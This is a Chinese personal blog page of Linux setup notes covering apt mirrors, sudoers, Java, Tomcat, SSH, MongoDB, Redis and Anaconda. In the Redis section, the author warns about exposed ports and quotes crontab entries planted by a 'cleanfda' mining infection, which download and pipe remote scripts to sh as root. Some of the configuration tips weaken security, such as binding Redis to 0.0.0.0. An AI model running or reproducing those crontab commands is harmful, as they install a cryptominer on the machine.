<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Linux手册 | Binb&#39;s Blog</title>
<meta name="keywords" content="Linux">
<meta name="description" content="Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1">
<meta name="author" content="chance7bin">
<link rel="canonical" href="https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.be81eec981a615a87a88f121642d7eebde74d033438693944db2fd6b827284ff.css" integrity="" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity=""
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg">
<link rel="icon" type="image/png" sizes="32x32" href="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg">
<link rel="apple-touch-icon" href="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg">
<link rel="mask-icon" href="https://chance7bin.github.io/img/%E7%BE%8E%E9%98%9F.jpg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Linux手册" />
<meta property="og:description" content="Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-03-21T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Linux手册"/>
<meta name="twitter:description" content="Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "📚 文章",
      "item": "https://chance7bin.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "👨🏻‍💻 我的笔记",
      "item": "https://chance7bin.github.io/posts/note/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Linux手册",
      "item": "https://chance7bin.github.io/posts/note/linux%E6%89%8B%E5%86%8C/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Linux手册",
  "name": "Linux手册",
  "description": "Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 打开终端输入命令下载vim工具 1 sudo apt-get install vim 1.备份 /etc/apt/sources.list 1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list 打开 /etc/apt/sources.list： 1",
  "keywords": [
    "Linux"
  ],
  "articleBody": "Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351\nhttps://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n打开终端输入命令下载vim工具\n1 sudo apt-get install vim 1.备份 /etc/apt/sources.list\n1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list\n打开 /etc/apt/sources.list：\n1 sudo vim /etc/apt/sources.list 在命令模式下输入 ggdG，删除全部内容.\n在输入模式下，粘贴复制下列内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse 上面这个会报错\n仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-security Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。\n解决方法：https://blog.csdn.net/gezongbo/article/details/121056781\n适用于ubuntu18.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu bionic main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-backports main multiverse restricted universe 适用于ubuntu20.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu focal main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-backports main multiverse restricted universe 保存退出.\n3.更新\n1 sudo apt update 设置root密码 Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码\n终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了\n如何解决：不在 sudoers 文件中此事将被报告？\n1.首先切换到root用户下，输入当前用户账号密码\nsu - root\n2.输入sudo相关命令\nchmod 740 /etc/sudoers\nsudo gedit /etc/sudoers\n3.添加权限\n找到\n1 2 # Allow members of group sudo to execute any command %sudo ALL=(ALL) ALL 在下面添加一行，如下\nxx ALL=(ALL) ALL (将此处的XX修改为出现该问题的用户名！）\r拓展：\nsudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码\nLinux命令su、sudo、sudo su、sudo -i使用和区别\n提升用户权限 https://www.cnblogs.com/rnckty/p/5741956.html\nUbuntu默认root密码\nhttps://blog.csdn.net/jiangshuanshuan/article/details/95715837\n安装Java Java推荐用安装包安装 之后安装Tomcat比较方便\n安装包：\nhttps://blog.csdn.net/qq_34412086/article/details/88035820\n1.上传安装包jdk-8u301-linux-x64.tar.gz\n2.解压压缩包\ntar -zxvf jdk-8u301-linux-x64.tar.gz\n3.配置环境变量\nvim /etc/profile\n在末尾加入如下配置\n1 2 3 4 export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 4.检查环境是否配置完成\nsource /etc/profile\njava -version\n命令行： 不会给你配JAVA_HOME\nhttps://blog.csdn.net/wan_ide/article/details/99447752\n输入命令：\n1 sudo apt install openjdk-8-jdk-headless 等待安装完成\n安装完成后用 java -version 检验是否安装成功\n1 java -version Linux如何查看JDK的安装路径\nhttps://www.cnblogs.com/kerrycode/p/4762921.html\n安装Tomcat https://blog.csdn.net/qq_34412086/article/details/88038210\n1.上传压缩包并解压\ntar -zxvf apache-tomcat-8.5.41.tar.gz\n2.配置startup.sh\n启动Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件startup.sh。在startup.sh文件最后的exec上方添加如下配置\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 3.关闭Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件shutdown.sh。配置shutdown.sh\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 4.启动\n进入到tomcat的bin目录下，./startup.sh\n后面的环境配置可以考虑不用（不知道会不会有什么问题）\n修改文件\n1 sudo gedit filename linux命令行下，在任意目录下启动Tomcat\nhttps://blog.csdn.net/qq_40794973/article/details/86591391\n==关闭TOMCAT日志的三个方法==\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n开启远程连接ssh服务端 https://jingyan.baidu.com/article/359911f5a5b74857fe0306c4.html\n首先看看自己的Ubuntu是不是已经安装或启用了ssh服务，执行ps -e | grep ssh\n我们看到只有ssh-agent 这个是ssh-client客户端服务，如果有sshd，证明你已经装好了ssh-server并已启用，当然就可以不用往下看了\n如果没有安装执行sudo apt install openssh-server开始安装，输入yes回车\n执行完了就代表安装完成了\n然后再执行ps -e | grep ssh，发现多了sshd,远程连接本电脑就已经启用了\n然后我们通过其他电脑或服务器连接本电脑执行ssh ‘你的用户名’@‘你的ip’，然后输入yes,然后输入密码，就成功连接了\n最后执行ls，可以看到自己熟悉的ubuntu文件了\n开启远程连接ubuntu root权限 https://blog.csdn.net/qq_35445306/article/details/78771398\nUbuntu输入su提示认证失败的解决方法（接上） https://blog.csdn.net/henren555/article/details/7546508\n1 2 3 4 5 6 7 8 9 10 11 终端下 studiogang@studiogang:~$ sudo passwd Password: \u003c--- 输入安装时那个用户的密码 Enter new UNIX password: \u003c--- 新的Root用户密码 Retype new UNIX password: \u003c--- 重复新的Root用户密码 passwd：已成功更新密码 xshell一直断开连接：Socket error Event: 32 Error: 10053 https://blog.csdn.net/betonme/article/details/102546857\n修改/etc/ssh/sshd_config文件\n1 vim /etc/ssh/sshd_config 将port的注释#删去，重启ssh服务 ,\n1 service ssh restart 安装Nginx https://www.cnblogs.com/fengkun125/p/14142912.html\n参考尚硅谷的教程安装 用wget安装Nginx\n1 2 3 4 5 # 切换至root用户 sudo su root apt-get install nginx nginx -v service nginx start 用安装包一堆坑\nsudo make \u0026\u0026 make install 后面那个命令会报没有权限\n未发现软件包gcc-c+：\n1 2 sudo apt install gcc sudo apt install g++ zlib 找不到：\n直接wget安装\nhttps://www.php.cn/blog/detail/13838.html\nTomcat开放对外的端口 查看已经开放的端口号\n1 firewall-cmd --list-all 对外开放访问的端口\n1 2 3 firewall-cmd --add-port=8080/tcp --permanent firewall-cmd --reload 关闭对外端口\n1 2 firewall-cmd --remove-port=80/tcp --permanent firewall-cmd --reload Windows文件换行符转Linux换行符 https://blog.csdn.net/cjf_iceking/article/details/47836201\n操作系统文件换行符\n首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为’\\r’和’\\n’。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：\n1 2 3 4 Unix和类Unix（如Linux）：换行符采用 \\n Windows和MS-DOS：换行符采用 \\r\\n Mac OS X之前的系统：换行符采用 \\r Mac OS X：换行符采用 \\n 使用cat -A [Filename] 查看\n使用命令\"dos2unix\"，如下所示\n1 2 [root@localhost test]# dos2unix gggggggg.txt dos2unix: converting file gggggggg.txt to UNIX format ... 安装anaconda 第一步 - 检索最新版本的Anaconda\n在Web浏览器中，转到Anaconda下载页面，可通过以下链接访问：\n1 https://www.anaconda.com/download/ 找到最新的Linux版本并复制安装程序bash脚本。\nAnaconda安装包下载\n（1）官网下载，下载速度较慢 （2）清华大学开源软件镜像站\n第二步 - 下载Anaconda Bash脚本\n以sudo非root用户身份登录到您的Ubuntu 18.04服务器，进入该/tmp目录并使用curl下载您从Anaconda网站复制的链接：\n1 2 cd /tmp curl -O https://repo.anaconda.com/archive/Anaconda3-5.2.0-Linux-x86_64.sh 或者下载完成后把bash脚本传输到linux上\n第三步 - 验证安装程序的数据完整性\n通过SHA-256校验和通过加密哈希验证确保安装程序的完整性：\n1 sha256sum Anaconda3-5.2.0-Linux-x86_64.sh 输出如下所示：\n1 09f53738b0cd3bb96f5b1bac488e5528df9906be2480fe61df40e0e0d19e3d48 Anaconda3-5.2.0-Linux-x86_64.sh 第四步 - 运行Anaconda脚本\n1 bash Anaconda3-5.2.0-Linux-x86_64.sh 将收到以下输出以查看许可协议，按ENTER键直到到达结尾。\n1 2 3 4 5 6 7 8 Welcome to Anaconda3 5.2.0 In order to continue the installation process, please review the license agreement. Please, press ENTER to continue \u003e\u003e\u003e ... Do you approve the license terms? [yes|no] 当到达许可证末尾时，只要同意完成安装的许可证即可输入yes。\n第五步 - 完成安装过程\n一旦同意许可，系统将提示选择安装位置。可以按ENTER接受默认位置，或指定其他位置。\n1 2 3 4 5 6 7 8 Anaconda3 will now be installed into this location: /home/sammy/anaconda3 - Press ENTER to confirm the location - Press CTRL-C to abort the installation - Or specify a different location below [/home/sammy/anaconda3] \u003e\u003e\u003e 此时，安装将继续。请注意，安装过程需要一些时间。\n第六步 - 选择选项\n安装完成后，您将收到以下输出：\n1 2 3 4 5 ... installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] \u003e\u003e\u003e 建议输入yes以使用该conda命令。\n接下来，系统将提示下载Visual Studio Code，可以从官方VSCode网站了解更多信息。\n输入yes要安装和no拒绝安装。\n第七步 - 激活安装\n现在可以使用以下命令激活安装：\n1 source ~/.bashrc 第八步 - 测试安装\n使用此conda命令测试安装和激活：\n1 conda list 将收到通过Anaconda安装可用的所有软件包的输出。\n第九步 - 设置Anaconda环境\n可以使用该conda create命令创建Anaconda环境。例如，可以使用以下命令创建名为my_env的Python 3环境：\n1 conda create --name my_env python=3 像这样激活新环境：\n1 source activate my_env 您的命令提示符前缀将更改以反映您处于活动的Anaconda环境中，现在您已准备好开始处理项目。\n常用命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #创建虚拟环境 conda create -n your_env_name python=X.X（3.6、3.7等） #激活虚拟环境 source activate your_env_name(虚拟环境名称) #退出虚拟环境 source deactivate your_env_name(虚拟环境名称) #删除虚拟环境 conda remove -n your_env_name(虚拟环境名称) --all #查看安装了哪些包 conda list #安装包 conda install package_name(包名) conda install scrapy==1.3 # 安装指定版本的包 conda install -n 环境名 包名 # 在conda指定的某个环境中安装包 #查看当前存在哪些虚拟环境 conda env list #或 conda info -e #或 conda info --envs #检查更新当前conda conda update conda #更新anaconda conda update anaconda #更新所有库 conda update --all #更新python conda update python 安装mongodb apt安装 https://blog.csdn.net/yutu75/article/details/110941936\n基本安装\n目前最新版本为4.4版本，ubuntu20.04中默认安装的是3.6版本【可以继续基于这个版本进行学习，这块内容跳过即可】。\n安装之前建议更新下Linux源.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 1、备份源文件 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak # 2、添加源到sources.list中 sudo gedit /etc/apt/sources.list # 在打开的文本中，添加阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse # 3、更新源 sudo apt-get update 如果要在ubuntu20.04中安装最新4.4版本mongodb，则需要完成以下命令步骤：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 安装依赖包 sudo apt-get install libcurl4 openssl # 关闭和卸载原有的mongodb service mongodb stop sudo apt-get remove mongodb # 导入包管理系统使用的公钥 wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add - # 如果命令执行结果没有显示OK，则执行此命令在把上一句重新执行：sudo apt-get install gnupg # 注册mongodb源 echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.4 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list # 更新源 sudo apt-get update # 安装mongodb sudo apt-get install -y mongodb-org=4.4.2 mongodb-org-server=4.4.2 mongodb-org-shell=4.4.2 mongodb-org-mongos=4.4.2 mongodb-org-tools=4.4.2 # 安装过程中如果提示: mongodb-org-tools : 依赖: mongodb-database-tools 但是它将不会被安装 # 终端下运行以下命令,解决: # sudo apt-get autoremove mongodb-org-mongos mongodb-org-tools mongodb-org # sudo apt-get install -y mongodb-org=4.4.2 # 创建数据存储目录 sudo mkdir -p /data/db # 修改配置，开放27017端口 sudo vim /etc/mongod.conf # 把12行附近的port=27017左边的#号去掉 启动和关闭MongoDB\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 重新加载配置，并启动mongodb sudo systemctl daemon-reload sudo systemctl start mongod # 查看运行状态 sudo systemctl status mongod # 如果mongodb状态为stop，则运行 sudo systemctl enable mongod # 停止mongodb sudo systemctl stop mongod # 重启mongodb sudo systemctl restart mongod Ubuntu安装mongo并设置账户密码\n==问题：==\nmongodb启动之后立马关闭\n1.修改/tmp目录下mongodb-23266.sock的权限\n1 2 3 4 5 cd /tmp ls -l *.sock chown root:root mongodb-23266.sock systemctl start mongod systemctl status mongod 修改之后启动mongodb，出现另外一个错误\n打开日志查看错误：\n==建议重装==\n压缩包安装 mongodb彻底卸载方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 1.停止 mongodb服务 sudo service mongod stop 2.卸载mongodb sudo apt-get remove mongodb 3.移除相关包 sudo apt-get purge mongodb-org* sudo apt-get purge mongodb sudo apt-get autoremove sudo apt-get autorclean 4.移除相关目录 sudo rm -r /var/log/mongodb sudo rm -r /var/lib/mongodb 5.查看系统还有哪些残留的文件或目录 whereis mongo whereis mongodb whereis mongod which mongo which mongodb which mongod 6.删除/data/db（我自己加的） rm -rf /data/db 安装redis ==重要的事情说三遍！：服务器上不要开放对外端口，必要时修改端口，设置密码，不然会被注入cleanfda木马==\nhttps://developer.aliyun.com/article/764565\n一、在 Ubuntu 20.04 上安装 Redis\n在 Ubuntu 上安装 Redis 非常简单直接。\nRedis 5.0 被包含在默认的 Ubuntu 20.04 软件源中。想要安装它，以 root 或者其他 sudo 身份运行下面的命令：\n1 2 sudo apt update sudo apt install redis-server 一旦安装完成，Redis 服务将会自动启动。想要检查服务的状态，输入下面的命令：\n1 sudo systemctl status redis-server 你应该看到下面这些：\n1 2 3 4 5 ● redis-server.service - Advanced key-value store Loaded: loaded (/lib/systemd/system/redis-server.service; enabled; vendor preset: enabled) Active: active (running) since Sat 2020-06-06 20:03:08 UTC; 10s ago ... 如果你的服务器上禁用 IPv6，那么 Redis 服务将会启动失败。 就这些。你已经在你的 Ubuntu 20.04 上安装并运行了 Redis。\n二、配置 Redis 远程访问\n默认情况下，Redis 不允许远程连接。你仅仅只能从127.0.0.1（localhost）连接 Redis 服务器 - Redis 服务器正在运行的机器上。\n如果你正在使用单机，数据库也同样在这台机器上，你不需要启用远程访问。\n想要配置 Redis 来接受远程访问，使用你的文本编辑器打开 Redis 配置文件 （查看redis配置文件位置）：\n1 sudo nano /etc/redis.conf 定位到以bind 127.0.0.1 ::1开头的一行，并且取消它的注释：\n1 2 # bind 0.0.0.0 ::1 如果你的服务器有局域网 IP，并且你想要 Redis 从局域网可以访问 Redis，在这一行后面加上服务器局域网 IP 地址。 保存这个文件，并且重启 Redis 服务，使应用生效：\n1 sudo systemctl restart redis-server 使用下面的命令来验证 Redis 服务器正在监听端口6379：\n1 ss -an | grep 6379 你应该能看到类似下面的信息：\n1 2 tcp LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* tcp LISTEN 0 511 [::]:6379 [::]:* 同时还要进行如下配置，防止redis运行几天后报错\nRedis踩坑——MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on\n1.直接修改redis.conf配置文件，但是更改后需要重启redis。\n修改redis.conf文件：\n（1）vim打开redis-server配置的redis.conf文件 /etc/redis/redis.conf，\n（2）使用快捷匹配模式：\n/stop-writes-on-bgsave-error定位到stop-writes-on-bgsave-error字符串所在位置，\n（3）把后面的yes设置为no。\n2.在/etc/sysctl.conf 添加一项 vm.overcommit_memory = 1 ，然后重启（或者运行命令sysctl vm.overcommit_memory=1 ）使其生效）\n使用如下命令刷新配置，使其立即生效：\n1 2 sysctl -p sysctl -w net.ipv4.route.flush=1 重启redis失效\n杀死redis进程重新restart\nps -ef | grep redis\nkill -s 9 进程id\nsystemctl restart redis.service\n还是启动不起来，打开日志查看问题\ncat /var/log/redis/redis-server.log\nWrite error saving DB on disk: No space left on device\n查看磁盘的占用情况\ndf -h\n还真满了\n寻找原因：\n从根目录下开始使用du命令查找出空间占用最大的文件\n1 2 #查看当前目录下每个文件夹所占用的空间 du -sh * 删除掉大文件之后还是不行，再次执行df -h查看磁盘使用状况，可以看到/snap下的文件使用情况都是100%\n可以看到/opt文件夹占用了极大的空间，再一层层排查发现是tomcat生成的日志文件过大\n删除掉tomcat的日志即可\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n杀死redis进程失效\n执行sysctl vm.overcommit_memory=1便可重启redis： systemctl restart redis.service\nredis启动报WARNING\n8423:M 01 Aug 10:47:50.770 # WARNING you have Transparent Huge Pages (THP) support enabled in your ernel. This will create latency and memory usage issues with Redis. To fix this issue run the commad ’echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled’ as root, and add it to your /etc/rc.loal in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.\nroot用户执行echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled\n编辑/etc/rc.local在最后一行添加echo never \u003e /sys/kernel/mm/transparent_hugepage/enabled\n重启redis： systemctl restart redis.service\n8528:M 01 Aug 11:00:34.857 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n解决方法\n方式一：设置的值128较低，需要“echo 511 \u003e /proc/sys/net/core/somaxconn”命令，注意此命令只是暂时生效，如果重启后就会失效。\n方式二：永久解决Redis中The TCP backlog setting of 511 cannot be enforced告警问题，编辑/etc/sysctl.conf文件，添加net.core.somaxconn = 1024然后执行sysctl -p命令查看是否添加成功，之后重启Redis服务即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [root@mrwang redis-4.0.9]# vim /etc/sysctl.conf [root@mrwang redis-4.0.9]# sysctl -p vm.swappiness = 0 kernel.sysrq = 1 net.ipv4.neigh.default.gc_stale_time = 120 net.ipv4.conf.all.rp_filter = 0 net.ipv4.conf.default.rp_filter = 0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.lo.arp_announce = 2 net.ipv4.conf.all.arp_announce = 2 net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.core.somaxconn = 1024 systemctl status redis-server 报错\nredis-server.service: Can’t open PID file /var/run/redis/redis-server.pid (yet?) after start: No such file or directory\n解决方法如下：\nhttps://blog.csdn.net/zhangpeterx/article/details/104093275\n1 2 vi /usr/lib/systemd/system/redis.service #centos 7 nano /etc/systemd/system/redis.service #debian/ubuntu 在[Service]下新增一行ExecStartPost=/bin/sh -c \"echo $MAINPID \u003e /var/run/redis/redis.pid\"\n1 2 3 4 5 [Service] Type=forking ExecStart=/usr/bin/redis-server /etc/redis/redis.conf ExecStop=/bin/kill -s TERM $MAINPID ExecStartPost=/bin/sh -c \"echo $MAINPID \u003e /var/run/redis/redis.pid\" 随后重启服务：\n1 2 3 sudo systemctl daemon-reload sudo systemctl enable redis-server sudo systemctl restart redis.service redis运行时日志报错\n==Redis被挖矿脚本注入了！！！==\n3543227:M 01 Aug 2022 21:27:36.031 * 1 changes in 900 seconds. Saving… 3543227:M 01 Aug 2022 21:27:36.031 * Background saving started by pid 3604362 3604362:C 01 Aug 2022 21:27:36.031 # Failed opening the RDB file crontab (in server root dir /etc) for saving: Read-only file system 3543227:M 01 Aug 2022 21:27:36.131 # Background saving error\nhttps://blog.csdn.net/zhangjunli/article/details/103817837\n1 2 3 4 5 6 7 8 9 root@VM-0-10-ubuntu:/etc/redis# redis-cli 127.0.0.1:6379\u003e config get dir 1) \"dir\" 2) \"/etc\" 127.0.0.1:6379\u003e config set dir /var/lib/redis OK 127.0.0.1:6379\u003e config get dir 1) \"dir\" 2) \"/var/lib/redis\" 1 2 3 4 */2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh */3 * * * * root wget -q -O- http://en2an.top/cleanfda/init.sh | sh */4 * * * * root curl -fsSL http://195.242.111.238/cleanfda/init.sh | sh */5 * * * * root wd1 -q -O- http://195.242.111.238/cleanfda/init.sh | sh Linux管理python推荐使用miniconda 安装miniconda\nhttps://www.jianshu.com/p/47ed480daccc\n1、下载最新版 miniconda：\n1 wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh 2、在bash中安装：\n1 sh Miniconda3-latest-Linux-x86_64.sh 3、安装完成后，关闭terminal后，重新打开，输入以下命令以验证是否安装成功：\n1 conda -V 4、若要卸载，可直接删除已安装的文件夹后，并删除相应的环境变量：\n1 2 rm -rf /usr/local/miniconda/ rm -rf /usr/local/anaconda/ 删除后，打开 ~/.bashrc 文件，删除以下conda的路径变量：\n1 2 export PATH=\" /usr/local/anaconda/bin:$PATH\" export PATH=\" /usr/local/miniconda3/bin:$PATH\" 解决方案：\n打开一个终端，然后输入命令行打开bashrc文件：\n1 sudo gedit ~/.bashrc 注意这里要有sudo，不然无法编辑里面的内容。\n打开自己的安装目录/opt/software/miniconda3/bin，输入指令pwd查看路径。\n在bashrc文件中输入：\n1 export PATH=\"/opt/software/miniconda3/bin:$PATH\" 保存关闭bashrc文件，在命令行输入：\n1 source ~/.bashrc 随后检测一下：\n1 conda --version 如上图所示，成功。\n常用指令\nconda activate GIS\nconda create -n Name python=3.x(2.x)\nconda install xx (pip install xx)\nconda deactivate\n新建用户 如下操作都是在root用户下进行的\n新增单个用户 1 useradd user1 设置密码\n1 passwd user1 设置密码的时候，有的密码无法通过字典检查。 可以通过修改：/etc/security/pwquality.conf 文件 关闭字典检查。\n修改完成之后： 但是不建议这么修改。建议换个密码。\n删除帐号 删除一个已有的用户账号使用userdel命令，其格式如下：\n1 userdel 选项 用户名 常用的选项是 -r，它的作用是把用户的主目录一起删除。\n例如：\n1 # userdel -r sam 此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。\n/etc/passwd文件是用户管理工作涉及的最重要的一个文件。\nLinux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。\n1 2 3 4 5 